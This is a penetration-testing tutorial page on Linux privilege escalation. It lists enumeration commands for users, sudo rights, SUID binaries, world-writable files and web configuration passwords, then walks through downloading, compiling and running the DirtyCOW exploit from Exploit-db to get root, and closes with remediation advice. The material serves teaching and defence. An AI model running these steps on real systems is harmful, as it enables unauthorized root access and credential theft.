============================
Privilege escalation - Linux
============================

.. index::
   single: Privilege Escalation; Privilege Escalation - Linux

.. contents::
    :backlinks: top


####

    .. note::
        
        **Ressources**

            * :ref:`Blog - Linux Privilege Escallation <ref_linpriesc>`


A lot of devices running on Linux.

    .. note::

       Examples of devices that are very likely to run a Linux operating system are :

        * Firewalls
        * Routers
        * VOIP servers
        * NAS
        * Web servers
    
These kinds of devices are very critical for a company’s infrastructure with severe consequences
when they are compromised.

It happens very often that system administrators in Windows environments overlook the Linux devices
for many reasons. One of these reasons is the lack of knowledge about how to maintain Linux systems
and how to secure them. This can result in critical Linux devices being the weakest link in the
security chain and become a great security threat.

Therefore, it is very important as a penetration tester to focus not only on Windows systems because
they cover 90% of the company’s devices but also on (critical) Linux systems.

The most common ways of privilege escalation on Linux systems are leveraging kernel vulnerabilities,
misconfigurations and vulnerable software to execute arbitrary code under root privileges. New
kernel vulnerabilities occur on a regular basis and often involve a wide range of kernel versions.
A recently discovered example of a kernel vulnerability allowing for privilege escalation is the
**DirtyCOW vulnerability** affecting hundreds of Linux kernel versions. Also misconfigurations in
files, services and security mechanisms and out of date software commonly allow for privilege
escalation.

####

--------------------------------------
Collecting system information manually
--------------------------------------

Nearly every step of a Pentest is related to the **Enumeration**. The privilege escalation doesn't
make exception. Collecting relevant system information can be useful for privilege escalation such
as the kernel version, running services, installed applications and file permissions.

This will not only help us to gain a better understanding of how a system is configured but also to
know which applications and services are running on the host. Services running with root privileges
are of especial interest for privilege escalation. When we can exploit a service running as root to
execute arbitrary commands they will be executed as root. Applications that are configured to be
executed with higher privileges using a Linux feature named SUID are also very useful.

    .. note:: 
        
       For effective privilege escalation in Linux the system information you should know includes:

            * Distribution type
            * Kernel version
            * Running applications and services
            * Weak file permissions
            * Scheduled jobs
            * Other important information about the system. 

Collecting system information can be done both manually and automatically with scripts. The use of
automated scripts generally saves you a lot of time, but the information collected will be limited
to that which the script is programmed to retrieve. For example, if a script is not designed to
retrieve active connections then you may never find out about that one critical port running an
admin interface which is only accessible locally.

Linux command to get system information
=======================================

OS, Kernel & Hostname
---------------------

    .. note:: 
        
        The following commands print the operating system, kernel version, hostname and system
        information to the terminal.

        .. code:: inputLanguage
            :number-lines:
            :force:

             cat /etc/issue
             cat /proc/version
             hostname
             uname -a

        .. image:: images/Linux-local-enumeration1.jpg
           :width: 500 px
           :align: center

        This information acquired can be used to check the Linux distribution and kernel for known
        vulnerabilities, for instance, on Exploit-db or with searchsploit.

It is also highly recommended to search the OS version in Google or Exploit-db for available
(kernel) exploits. This sometimes produces better search results.

    .. note:: 
        
        The following example concerns a machine with kernel version **3.10.0-123 on CentOS
        7.0.1406** which is vulnerable to **CVE2014-3153**
        
        .. code:: shell
            :number-lines:
            :force:

             cat /etc/centos-release

        .. image:: images/PE-OS-Version-03-2.jpg
           :width: 500 px
           :align: center

Searching for the specific kernel version does not immediately return useful search results for
privilege escalation exploits.

    .. note:: 
        
        Searching on the OS version for privilege escalation exploits does provide some interesting
        results.

        .. image:: images/PE-OS-Version-01.jpg
           :width: 500 px
           :align: center

Another good approach is to search Exploit-DB on the kernel version (or any identified software)
from narrow to wide with the "local" filter to ensure the exploits are local exploits only.

    .. note:: 
        
        For Linux Kernel 3.10.0-123
        
        .. code:: shell
            :number-lines:
            :force:

             Linux kernel 3.10.0-123 // No results.
             Linux kernel 3.10.0     // 1 local exploit matching the kernel version.
             Linux kernel 3.10       // No results that match the CentOS 7 operating system.

        The following search looks for Linux kernels starting with "Linux Kernel 3.1", which is
        actually actually kernel version 3.1 and above.

        .. code:: shell
            :number-lines:
            :force:

             Linux kernel 3.1

        This search returns 2 new results that match the OS version: **Libfutex** and **Remount FUSE**

        .. image:: images/linuxKernel3.1.jpg
            :width: 500 px
            :align: center

        The search results page shows 13 more entries that match our search, but they can be
        discarded because they don't match the Kernel or operating system version.

Users
-----

The next commands can be used to retrieve information related to system users, active sessions and
the current user.

    .. note:: 
        
        **passwd**

        The **passwd file** stores essential user account information required during login. The
        passwd file is stored in the **/etc** directory and contains information such as :
        
            * user ID
            * group ID
            * home directory
            * the path to the command shell.
            
        An ‘x’ character means that the encrypted password is stored in the /etc/shadow file.
        
        .. code:: shell
            :number-lines:
            :force:

             cat /etc/passwd

        .. image:: images/image149.png
           :width: 500 px
           :align: center


    .. note:: 
        
        **Current User and active session**
        
        .. code:: shell
            :number-lines:
            :force:

             id
             who
             w

        .. image:: images/image150.png
           :width: 500 px
           :align: center


Make sure you pay attention to the groups to which the privileged user belongs. One especially
important group is the **sudo (‘Super User Do’) group**. A user that is member of the sudo group is
able to execute commands in the context of the root user without providing the root password.
Depending on the settings in the sudoer file you may only need to enter the password for the current
user or none at all.

    .. note:: 
        
        **display a list of commands as super.**

        When the user is part of the sudo group you can display a list of commands that can be
        executed as super.
        
        .. code:: shell
            :number-lines:
            :force:

             sudo -l

        .. image:: images/sudo-l-root.jpg
           :width: 500 px
           :align: center

The sudo command on Linux is very configurable. Instead of allowing a limited user to execute all
commands as root, it is possible to limit a user’s sudo privileges to certain commands by
whitelisting them in the /etc/sudoers file.

    .. note:: 
        
        The following line in the sudoers file, for instance, will allow the root privileges for a
        user called ‘useraccount’ to execute apt-get and shutdown.
        
        .. code:: shell
            :number-lines:
            :force:

             useraccount ALL=/usr/bin/apt-get,/sbin/shutdown

        .. image:: images/sudo-l-user.jpg
           :width: 500 px
           :align: center

SUID
----

    .. note:: 
        
        Exploring SUID permissions
        
        .. code:: shell
            :number-lines:
            :force:

             find /* -user root -perm -4000 -print 2>/dev/null


Networking information
----------------------

The following commands retrieve networking information such as the available network adapters and
configuration, routes, active connections and other network related information.

    .. note:: 
        
        **Network adapters**
        
        .. code:: shell
            :number-lines:
            :force:

             ipconfig -a

        .. image:: images/image151.png
           :width: 500 px
           :align: center


    .. note:: 
        
        **print the routing table**
        
        .. code:: shell
            :number-lines:
            :force:

             route

        .. image:: images/image152.png
           :width: 500 px
           :align: center


    .. note:: 
        
        **print the active connections to the terminal**
        
        .. code:: shell
            :number-lines:
            :force:

             netstat -antup

        .. image:: images/image153.png
           :width: 500 px
           :align: center


    .. note:: 
        
        **prints the ARP table**
        
        .. code:: shell
            :number-lines:
            :force:

             arp -e

        .. image:: images/image154.png
           :width: 500 px
           :align: center

Applications and services
-------------------------

These commands retrieve information about applications and services.

Knowing which services are running with root privileges can be very important for privilege
escalation because exploiting them will result in root level access.

    .. note:: 
        
        .. code:: shell
            :number-lines:
            :force:

             ps aux

        .. image:: images/image155.png
           :width: 500 px
           :align: center


    .. note:: 
        
        **retrieve installed applications**
        
        .. code:: shell
            :number-lines:
            :force:

             # Debian and derivative
             dpkg -l

             # Fedora based distros
             rpm -qa

        .. image:: images/image156.png
           :width: 500 px
           :align: center


Configurations files may contains sensitive information about applications and services which can
also be very useful information for privilege escalation purposes.

    .. note:: 
        
        **list configuration files in the /etc directory**
        
        .. code:: shell
            :number-lines:
            :force:

             ls -ls /etc/ | grep .conf

        .. image:: images/image157.png
           :width: 500 px
           :align: center


Also try searching the web directory for any web application configuration files that contain
passwords.

    .. note:: 
        
        **Search for web directory**
        
        .. code:: shell
            :number-lines:
            :force:

             ls -ls /var/www/html/

        .. image:: images/priv-esca-linux-web-dirs.jpg
           :width: 500 px
           :align: center

    .. important:: 
        
        **Hint**

        Joomla installations contain a configuration file named **‘configuration.php’** and
        WordPress uses the ‘wp-config.php’ file for this purpose. These configuration files contain
        valuable information such as the MySQL username and password. If you encounter web
        applications on a compromised host, be sure to check their configuration files for
        information that can be used for privilege escalation. It is very common for web admins to
        re-use passwords on other accounts.

Files and file systems
----------------------

Another important thing to look at are files and directories that have world writable permissions.
**Files with world writable permissions can be modified by any user on the system**.

    .. note:: 
        
        **check for unmounted file systems**
        
        .. code:: shell
            :number-lines:
            :force:

             cat /etc/fstab

        .. image:: images/image159.png
           :width: 500 px
           :align: center

    .. note:: 
        
        **World writable directories**
        
        .. code:: shell
            :number-lines:
            :force:

             find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root

    .. note:: 
        
       **World writable directories for root** 
        
        .. code:: shell
            :number-lines:
            :force:

             find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root

    .. note:: 
        
        **World writable files**
        
        .. code:: shell
            :number-lines:
            :force:

             find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null

These next commands print the search results to the terminal without any additional information.

    .. note:: 
        
        **Find world writable files in /etc**
        
        .. code:: shell
            :number-lines:
            :force:

             find /etc -perm -2 -type f 2>/dev/null

    .. note:: 
        
        **searches for world writable directories**
        
        .. code:: shell
            :number-lines:
            :force:

             find / -writable -type d 2>/dev/null

    .. note:: 
        
        **Search for binaries with special capabilities**
        
        .. code:: shell
            :number-lines:
            :force:

             getcap -r / 2>/dev/null



Automated Scripts
=================

Instead of manually searching for vulnerabilities and misconfigurations for privilege escalation,
you can also use scripts to automate the process of collecting system information and testing for
vulnerabilities. Some of the scripts even suggest exploits based on the information they find.

    .. important:: 
        
        **Remember**

        It is necessary to transfert or upload those script to the target.

Here are some scripts to perform an automatic scan to seek for some vulnerability or
mis-configuration witch can lead to Privilege Escalation :

    * :ref:`LinPEAS <ref_LinPEAS>`

    * :ref:`Unix-privesc-checker <ref_unixPrivescCheck>`

Limitations of automated scripts
================================

Automated vulnerability scanners and scripts usually rely on a database of known vulnerabilities
which is only as valid as the last update. Using outdated vulnerability databases with automated
scanning tools will result in overlooking any recently discovered vulnerabilities.

Another limitation of scripts is that they are generally considered ‘dumb’. They are programmed only
to perform a given series of checks and nothing more. Unless a check is included in the scanning
routine, the script will miss vulnerabilities and misconfigurations that might have otherwise easily
been discovered with manual testing.

There’s also a complexity issue when using automated tools.
Automated tools cannot (yet) draw conclusions in the same way that human experts can. In other
words, in the final analysis, automated scanners and scripts are likely to be less effective and
less insightful than manual testing by an expert.

It’s important, therefore, to realize that automated vulnerability scanning and scripts are
imperfect solutions that merely identify those security issues which have been programmed into them.
However, they can help identify such issues before attackers do (after all, attackers may well be
using those self-same tools).

The privilege escalation scripts are great at finding the low hanging fruit on Linux systems, but
try not to become too reliant on them and make sure you develop your manual testing skills to be
able to provide greater depth in your vulnerability testing.


####

---------------------------
Exploiting the Linux kernel
---------------------------

It is advised to always check the running Linux kernel for vulnerabilities that can be exploited to
perform privilege escalation. Infrequently updated Linux systems are likely to be vulnerable to one
or more kernel privilege escalation exploits.

The following exemple are based on the 'DirtyCOW' vulnerability.

Downloading and compiling the exploit
=====================================

Sometimes the target doesn't have the necessary tools to compile the exploit. In this case, you can
compile the exploit on your own machine and transfer it to the target.

    .. note:: 
        
        Downloading the 40616 exploit from Exploit-db :

        .. code:: shell
            :number-lines:
            :force:

             wget https://www.exploit-db.com/download/40616 -O cowroot.c

    .. danger:: 
        
        **Don't use an exploit without a previous reading**
        
            The reading of the exploit will:

            #. Allow you to understand the vulnerability and how to
               exploit it.

            #. Gave you some further instruction on how to compile the exploit.

            #. Ensure you that the exploit have not some malicious code.

In this exemple, the first instruction is to comment / uncomment the payload of the architecture of
the target.

    .. note:: 
        
        .. image:: images/image164.png
           :width: 500 px
           :align: center

Use the 'uname' command to get the architecture of the target.

    .. note:: 
        
        .. code:: shell
            :number-lines:
            :force:

             uname -a

        .. image:: images/image163.png
           :width: 500 px
           :align: center

In this case the target is a 32-bit system (i686). The 64-bit payload must be disable and the
32-bit version must be enable.

    .. note:: 
        
        Now the exploit must be compiled with GCC
        
        .. code:: shell
            :number-lines:
            :force:

             gcc cowroot.c -o cowroot -pthread


    .. important:: 
        
        In some cases, you may get an error related to the GLIB version not found when executing a
        locally compiled exploit. You can fix this error by appending the **-static** flag to the
        compilation command.
        
        .. code:: shell
            :number-lines:
            :force:

             gcc cowroot.c -o cowroot -pthread -static

If the file 'cowroot' was created from the attack machine, it is necessary to upload it to the
target. Most of the time it is a download from the target itself. (cURL, wget, etc.)

Once the exploit is on the target, we need to make it executable.

    .. note:: 
        
        .. code:: shell
            :number-lines:
            :force:

             chmod +x cowroot

             # or in binary mode
             chmod 755 cowroot


Executing the exploit
=====================

    .. note:: 
        
        Execute the compiled exploit and wait for it to add a new admin user to the system.

        .. code:: shell
            :number-lines:
            :force:

             ./cowroot

        .. image:: images/image168.png
           :width: 500 px
           :align: center

The exploit here ran successfully and upgraded our shell to a root shell granting us full control
over the target host.

    .. note:: 
        
        The exploit instructions advice running the following command to prevent the system
        becoming unstable and crashing:
        
        .. code:: shell
            :number-lines:
            :force:

             echo 0 > /proc/sys/vm/dirty_writeback_centisecs

####

------------------------
Remediation & Mitigation
------------------------

Despite great deal of effort and a programme of continuous improvement, privilege escalation
vectors for the Linux kernel are still very common and a problem for the Linux community. The best
way to defend against known Linux kernel vulnerabilities is to update the kernel to the latest version on a regular basis.

If we look at a successful exploitation of the DirtyCOW vulnerability, we can distinguish five
requirements:

    #. A vulnerable kernel;

    #. A working exploit;

    #. A way to transfer the exploit to the target;

    #. A way to compile the exploit;

    #. A way to execute the exploit.

In general, with the exception of point 4, these requirements apply to most kernel attacks. Point 4
is not universally applicable because it is also possible to use a local system which matches the
vulnerable target to compile the exploit. To mitigate kernel attacks, system administrators can
take steps to prevent attackers from transferring, compiling and executing (kernel) exploits. This
will reduce the attack surface significantly and render some ‘easy’ attacks ineffective.

Prevent transferring the exploit
================================

System administrators can remove any unnecessary tools and disable all services that could be used
to transfer files to the target. 

These include:

    * FTP,
    * TFTP,
    * SMB,
    * SCP,
    * wget,
    *  curl

Instead of removing and disabling such tools or services, another approach could be to restrict
access to them or grant access only for specific accounts (so-called ‘allowlisting’ where only
authorised accounts get access). While not infallible, such restrictions can prevent certain
attacks or create sufficient obstacles to force attackers to use adopting less inconspicuous
methods that are easier to detect. System administrators may also opt to monitor the usage of those
tools for suspicious or malicious activity.

Remove compilation tools
========================

The same applies to compilation tools, such as **GCC, CC** and other development tools. The general
rule for compilation tools (and other tools that can be leveraged for an attack) is that they
should only be installed if and for as long as you need them. If you really need to have
compilation tools on your system, make sure they are only available to specific user accounts. Of
course, this won’t stop attackers from compiling exploits on a similar local system, but in the
previous section we’ve learned how we can try to prevent the attacker from transferring and
executing the compiled exploit to the compromised host.

Prevent exploit execution
=========================

Finally, we can also prevent attackers from executing (kernel) exploits on a compromised system.
From this perspective, **it is important to limit writable and executable directories for system
users and services**. Specific attention should be paid to world-writable directories, such as the
**/tmp and /dev/shm directories**. By creating separate partitions, we can improve the security of
Linux systems by mounting directories such as /tmp and /home on a separated ‘noexec’ file system.
This means that binaries that are stored on these partitions cannot be executed by any user. This
way we can prevent attackers from executing exploits stored from the /tmp directory.

    .. note:: 
        
        To restrict the execution of existing applications for specific users, you can simply set
        appropriate permissions on the executable with the chmod command:
        
        .. code:: shell
            :number-lines:
            :force:

             chmod 700 /executable/file

        This will restrict executable file read/write/execute permissions to the owner of the file.







####

--------
Weblinks
--------

.. target-notes::